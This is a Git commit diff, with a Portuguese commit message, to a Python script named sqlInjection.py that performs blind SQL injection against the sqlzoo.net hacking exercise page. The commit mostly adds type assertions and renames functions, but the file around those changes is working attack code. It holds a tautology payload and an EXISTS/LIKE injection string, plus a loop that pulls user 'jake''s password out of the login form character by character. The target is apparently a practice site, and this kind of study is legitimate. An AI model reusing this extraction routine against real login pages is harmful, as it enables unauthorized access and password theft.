061c57bb83013bc75df4a481fbf5524ea936d774
Andre Barbosa <an.barbosa@outlook.com.br>
2018-10-10 23:41:47 -0300

    Inclusão de asserções diversas.

--- sqlInjection.py
+++ sqlInjection.py
@@ -15,20 +15,19 @@ logging.basicConfig(level = nivel, format = formato)
 
 URL = "http://sqlzoo.net/hack/passwd.pl"
 
-userJake  = "jake"
-
-userXXX = "xxx"
 trueQuery = "' OR ''='"
 
 
 def makeQuestionAboutPassword(query :str, user="jake" ) -> dict:
+    assert(type(user)==str)
+    assert(type(query)==str)
     statement = "' OR EXISTS(SELECT * FROM users WHERE name='{}' AND password LIKE '{}') AND ''='"
     senha = statement.format(user, query)
     pwd = {"name":"xxxNOxxx", "password":senha}
     return pwd
 
 
-def conectaCom(nome : str, senha : str) -> bool:
+def conectaComUsuarioESenha(nome : str, senha : str) -> bool:
     assert(type(nome)==str)
     assert(type(senha)==str)
     parametros = {"name": nome, "password": senha}
@@ -37,7 +36,8 @@ def conectaCom(nome : str, senha : str) -> bool:
     return "Welcome" in resultado.text
 
 
-def conecta(parametros:str)->bool:
+def conectaComParametros(parametros)->bool:
+    assert(type(parametros)==dict)
     logging.info("Username: %s\nSenha: %s\n" %(parametros["name"], parametros["password"]))
     resultado = requests.get(URL, params=parametros)
     logging.info("Conectando a: %s\n" % resultado.url)
@@ -46,6 +46,7 @@ def conecta(parametros:str)->bool:
 
 
 def obtemLetrasDaSenha(user="jake"):
+    assert(type(user)==str)
     resposta = ""
 
     intervaloSimbolos = chain(range(32,48),range(58,65),range(91,97), range(123, 127))
@@ -57,32 +58,39 @@ def obtemLetrasDaSenha(user="jake"):
         if chr(code)=="%" or chr(code)=="_":
             logging.info("Pulando % ou _")
             continue # Pula o codigo. Esses são caracteres coringa no SQL.
-        encontrado = conecta(makeQuestionAboutPassword("%"+chr(code)+"%", user))
+        encontrado = conectaComParametros(makeQuestionAboutPassword("%"+chr(code)+"%", user))
         logging.warning("Analisando "+chr(code))
         if encontrado:
             resposta += (chr(code))
             logging.info("A senha contém: %s\n" %(resposta))
     logging.info("A senha contém: %s\n" %(resposta))
+
+    assert(type(resposta)==str)
     return resposta
 
 
 def obtemOrdemDoisADois(letras): #letras = list(tupla(str))
+    assert(type(letras)==str)
     resposta = ""
     tuplas = []
     for code1 in letras:
         logging.warning("%s:" %code1)
         for code2 in letras:
             logging.warning("   %s" %code2)
-            ordem = conecta(makeQuestionAboutPassword("%"+code1+code2+"%"))
+            ordem = conectaComParametros(makeQuestionAboutPassword("%"+code1+code2+"%"))
             if(ordem):
                 logging.info("%s vem antes de %s." %(code1, code2))
                 resposta += code1+" vem antes de "+code2+"\n"
                 tuplas = tuplas + [(code1, code2)]
     print("Pares de letras: \n%s" %resposta)
+
+    assert(type(tuplas)==list)
+    # Na verdade é um list(tuplas): [(a,b), (c,d),(e,f)...]
     return tuplas
 
 
 def obtemSenhaAPartirDeLetrasOrdenadas(listaTuplas):
+    assert(type(listaTuplas)==list)
     tamanhoDaSenha = len(listaTuplas)+1
 
     inicio = None
@@ -130,34 +138,53 @@ def obtemSenhaAPartirDeLetrasOrdenadas(listaTuplas):
 
 
     logging.info("A senha é %s" %senha)
+    assert(type(senha)==str)
     return senha
 
 def senhaEncontrada(tamanhoEsperado:int, senhaObtida:str, restantes)->bool:
-    logging.info("Obtida: %s, Restante: %s", senhaObtida, restantes)
-    encontrada = len(restantes)==0 and len(senhaObtida)==tamanhoEsperado
-    logging.info("Senha encontrada? %s" %encontrada)
+    assert(type(tamanhoEsperado)==int)
+    if senhaObtida==None:
+        encontrada = False
+    else:
+        assert(type(senhaObtida)==str)
+        #assert(type(restante)==list[tuples])
+
+        logging.info("Obtida: %s, Restante: %s", senhaObtida, restantes)
+        encontrada = len(restantes)==0 and len(senhaObtida)==tamanhoEsperado
+        logging.info("Senha encontrada? %s" %encontrada)
+
+    assert(type(encontrada)==bool)
     return encontrada
     
 
 
 def proximos(palavra, listaTuplas):
     if(palavra == None):
+        assert(type(listaTuplas)==list)
         proximos = listaTuplas.copy()
     else:
+        assert(type(palavra)==str)
+        assert(type(listaTuplas)==list)
+
         ultimaLetra = palavra[-1:]
         logging.info("Obtendo proximo de %s [%s]." % (palavra, ultimaLetra))
         proximos = [t for t in listaTuplas if ultimaLetra==t[0] ]
         logging.info(proximos)
+
+    assert(type(proximos)==list)
     return proximos
 
 
 def senhaParaListaDeTuplas(senha):
+    assert(type(senha)==str)
     tamanho = len(senha)
     lista = []
     for i in range (tamanho-1):
         tupla = (senha[i], senha[i+1])
         lista = lista + [tupla]
     shuffle(lista)
+    
+    assert(type(lista)==list)
     return lista
             
 
@@ -167,7 +194,7 @@ letrasOrdenadas = obtemOrdemDoisADois(letrasDoJake);
 senhaDoJake = obtemSenhaAPartirDeLetrasOrdenadas(letrasOrdenadas)
 print("A senha de Jake é: %s." %senhaDoJake);
 
-
+# PlayTests
 # listaSenha = [ ('L', 'W'), ('E', 'L'),('O', 'D'), ('O', 'O'), ('W', 'O')]
 # print(obtemSenhaAPartirDeLetrasOrdenadas(listaSenha))
 
